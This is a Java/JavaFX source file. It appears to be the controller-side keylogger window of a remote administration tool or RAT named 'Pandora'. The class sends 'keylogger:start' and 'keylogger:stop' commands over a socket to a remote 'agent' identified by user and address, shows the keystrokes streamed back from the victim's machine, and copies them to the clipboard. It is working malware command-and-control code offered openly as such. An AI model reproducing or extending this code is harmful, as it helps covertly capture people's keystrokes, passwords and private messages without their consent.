package org.pandora.master.scene.impl.agent;


import javafx.geometry.Insets;
import javafx.scene.Scene;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.ScrollPane;
import javafx.scene.layout.AnchorPane;
import javafx.scene.layout.Background;
import javafx.scene.layout.BackgroundFill;
import javafx.scene.layout.CornerRadii;
import javafx.scene.paint.Color;
import javafx.scene.shape.Line;
import javafx.scene.text.Text;
import javafx.stage.WindowEvent;
import lombok.Getter;
import org.pandora.master.Master;
import org.pandora.master.builder.BuilderManager;
import org.pandora.master.builder.impl.scene.ControllerBuilder;
import org.pandora.master.data.agent.AgentData;

import java.awt.*;
import java.awt.datatransfer.StringSelection;

public class Keylogger {

    private final AnchorPane anchorPane;
    private final BuilderManager builderManager;
    @Getter
    private final AgentData agentData;
    private final Scene scene;
    private final Master master;
    private Text logText;
    private final ControllerBuilder controllerBuilder;
    private ScrollPane scrollPane;

    public Keylogger(final ControllerBuilder controllerBuilder) {
        this.controllerBuilder = controllerBuilder;
        this.master = controllerBuilder.getMaster();
        this.anchorPane = controllerBuilder.getAnchorPane();
        this.builderManager = controllerBuilder.getBuilderManager();
        this.agentData = controllerBuilder.getAgentData();
        this.scene = controllerBuilder.getScene();
    }

    public void open() {
        this.master.getStageManager().getScenes().put(this.controllerBuilder, this);
        this.anchorPane.setBackground(new Background(new BackgroundFill(Color.rgb(26, 27, 36), CornerRadii.EMPTY, Insets.EMPTY)));

        final Label defaultLabel = this.builderManager.getLabelBuilder().buildLabel("Keylogger | " + this.agentData.getUser() + "@" + this.agentData.getAddress(), 15, 20, Color.rgb(230, 230, 230), "Consolas", 17);
        final Line line = this.builderManager.getBasicLineBuilder().buildSimpleLine(Color.WHITE, 20, 54, 605, 54);

        final Text logText = this.builderManager.getTextBuilder().buildText("", 3, 3, Color.WHITE, "Consolas", 12);

        final ScrollPane scrollPane = this.builderManager.getScrollPaneBuilder().buildScrollPane(true, logText, 15, 70, 595, 210);
        logText.wrappingWidthProperty().bind(this.scene.widthProperty());

        final Button copyButton = this.builderManager.getButtonBuilder().buildButton(null, "Copy Content", 188, 305, Color.RED, "Verdana", 12, 250, 25, "agents-keylogger-copy");

        scrollPane.setHbarPolicy(ScrollPane.ScrollBarPolicy.NEVER);
        scrollPane.setVbarPolicy(ScrollPane.ScrollBarPolicy.NEVER);
        scrollPane.setId("agents-keylogger-scrollPane");

        this.scrollPane = scrollPane;
        this.logText = logText;

        this.sendRequest();

        copyButton.setOnAction(event -> {
            final StringSelection stringSelection = new StringSelection(this.logText.getText());
            Toolkit.getDefaultToolkit().getSystemClipboard().setContents(stringSelection, stringSelection);
            this.master.getNotification().notify("Keylogger", "Keys were successfully copied");
        });

        this.scene.getWindow().addEventFilter(WindowEvent.WINDOW_CLOSE_REQUEST, this::close);
        this.anchorPane.getChildren().addAll(defaultLabel, line, scrollPane, copyButton);
    }

    private void sendRequest() {
        this.master.getSocketUtils().write(this.agentData.getId(), "keylogger:start");
        this.scrollPane.setVvalue(1.0d);
    }

    public void receiveRequest(final String response) {
        this.logText.setText(this.logText.getText() + response.replace("(doubleDot)", ":").replace("(NEWLINE)", "\n"));
    }

    private void close(final WindowEvent event) {
        this.master.getSocketUtils().write(this.agentData.getId(), "keylogger:stop");
    }
}
